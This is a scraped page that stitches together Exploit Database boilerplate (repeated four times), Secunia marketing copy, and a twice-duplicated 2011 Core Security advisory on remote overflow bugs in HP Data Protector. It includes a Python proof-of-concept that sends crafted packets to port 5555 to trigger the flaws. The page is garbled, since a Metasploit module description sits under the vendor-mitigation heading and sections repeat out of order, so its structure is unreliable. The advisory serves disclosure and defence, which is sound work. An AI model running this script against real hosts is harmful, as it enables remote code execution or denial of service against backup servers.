##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

2. Vulnerability Information
Class: Remote stack overflow [CWE-120], Null pointer dereference [CWE-476], Improper input validation [CWE-20]
Impact: Code execution
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2011-1865, CVE-2011-1514, CVE-2011-1515
3. Vulnerability Description
HP Data Protector [1] is an automated backup and recovery software for single-server to enterprise environments. Multiple vulnerabilities have been found in HP Data Protector that could allow a remote attacker to execute arbitrary code and lead to denial of service conditions. The vulnerabilities are triggered by sending a request to port 5555 of a host running the "data protector inet" service, part of HP Data Protector. The request has several parameters, including an opcode. By sending requests with specially crafted parameters, the different bugs can be triggered.
4. Vulnerable packages
HP OpenView Storage Data Protector v6.20 (running on Windows).
HP OpenView Storage Data Protector v6.11 (running on Windows).
HP OpenView Storage Data Protector v6.10 (running on Windows).
HP OpenView Storage Data Protector v6.00 (running on Windows).
Previous versions may be affected, but were not tested.
5. Non-vulnerable packages
No fixes are available at the time of publication.
6. Vendor Information, Solutions and Workarounds
HP has issued a security bulletin with document ID c02872182 available through HP Support Center at http://www.hp.com/go/HPSC.
The latest version of HP Data Protector is vulnerable to these issues. HP has provided the following procedure to mitigate these vulnerabilities:

					This module exploits a vulnerability found in HP Data Protector's OmniInet
				process.  By supplying a long string of data as the file path with opcode '20',
				a buffer overflow can occur when this data is being written on the stack where
				no proper bounds checking is done beforehand, which results arbitrary code
				execution under the context of SYSTEM.  This module is also made against systems
				such as Windows Server 2003 or Windows Server 2008 that have DEP and/or ASLR
				enabled by default.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

HP Data Protector [1] is an automated backup and recovery software for
single-server to enterprise environments. Multiple vulnerabilities have
been found in HP Data Protector that could allow a remote attacker to
execute arbitrary code and lead to denial of service conditions. The
vulnerabilities are triggered by sending a request to port 5555 of a
host running the "data protector inet" service, part of HP Data
Protector. The request has several parameters, including an opcode. By
sending requests with specially crafted parameters, the different bugs
can be triggered.

4. *Vulnerable packages*

   . HP OpenView Storage Data Protector v6.20 (running on Windows).
   . HP OpenView Storage Data Protector v6.11 (running on Windows).
   . HP OpenView Storage Data Protector v6.10 (running on Windows).
   . HP OpenView Storage Data Protector v6.00 (running on Windows).
   . Previous versions may be affected, but were not tested.

5. *Non-vulnerable packages*

   . No fixes are available at the time of publication.

6. *Vendor Information, Solutions and Workarounds*

HP has issued a security bulletin with document ID c02872182 [2]
available through HP Support Center at http://www.hp.com/go/HPSC.

The latest version of HP Data Protector is vulnerable to these issues.
HP has provided the following procedure to mitigate these vulnerabilities:

   1. Upgrade to Data Protector A.06.20 or subsequent.
   2. Enable encrypted control communication services on cell server and
all clients in cell.

 The upgrade is available for download from
http://hp.com/go/dataprotector then under 'Product Information' click on
'Trials and Demos'.

7. *Credits*

These vulnerabilities were discovered by Oren Isacson from Core Security
Technologies. Publication was coordinated by Carlos Sarraute.

8. *Technical Description / Proof of Concept Code*

The following python script can be used to reproduce the different bugs.

/-----
import struct, socket, sys

target        = sys.argv[1]
opcode        = sys.argv[2]
string_lenght = int(sys.argv[3])
args_number   = int(sys.argv[4])
long_argument = int(sys.argv[5])

def to_wc(x):
    return ''.join(["%s\x00" % c for c in x] )

args = [to_wc('a')] * args_number
args[5] = to_wc(opcode)
args[long_argument] = 'a' * string_lenght
packet = ["\xff\xfe\x32\x00\x00\x00"]

for s in args:
    packet.append("\x20\x00" + s + "\x00\x00")

packet = ''.join(packet)
packet = struct.pack(">L", len(packet)) + packet

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect((target, 5555))
sock.send(packet)

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

1. \*Advisory Information\*
Title: Multiple vulnerabilities in HP Data Protector
Advisory ID: CORE-2011-0514
Advisory URL:
http://www.coresecurity.com/content/HP-Data-Protector-multiple-vulnerabilities
Date published: 2011-06-29
Date of last update: 2011-06-29
Vendors contacted: HP
Release mode: Coordinated release
2. \*Vulnerability Information\*
Class: Remote stack overflow [CWE-120], Null pointer dereference
[CWE-476], Improper input validation [CWE-20]
Impact: Code execution
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2011-1865, CVE-2011-1514, CVE-2011-1515
3. \*Vulnerability Description\*
HP Data Protector [1] is an automated backup and recovery software for
single-server to enterprise environments. Multiple vulnerabilities have
been found in HP Data Protector that could allow a remote attacker to
execute arbitrary code and lead to denial of service conditions. The
vulnerabilities are triggered by sending a request to port 5555 of a
host running the "data protector inet" service, part of HP Data
Protector. The request has several parameters, including an opcode. By
sending requests with specially crafted parameters, the different bugs
can be triggered.
4. \*Vulnerable packages\*

8. \*Technical Description / Proof of Concept Code\*
The following python script can be used to reproduce the different bugs.
/-----
import struct, socket, sys
target = sys.argv[1]
opcode = sys.argv[2]
string\_lenght = int(sys.argv[3])
args\_number = int(sys.argv[4])
long\_argument = int(sys.argv[5])
def to\_wc(x):
return ''.join(["%s\x00" % c for c in x] )
args = [to\_wc('a')] \* args\_number
args[5] = to\_wc(opcode)
args[long\_argument] = 'a' \* string\_lenght
packet = ["\xff\xfe\x32\x00\x00\x00"]
for s in args:
packet.append("\x20\x00" + s + "\x00\x00")
packet = ''.join(packet)
packet = struct.pack(">L", len(packet)) + packet
sock = socket.socket(socket.AF\_INET,socket.SOCK\_STREAM)
sock.connect((target, 5555))
sock.send(packet)
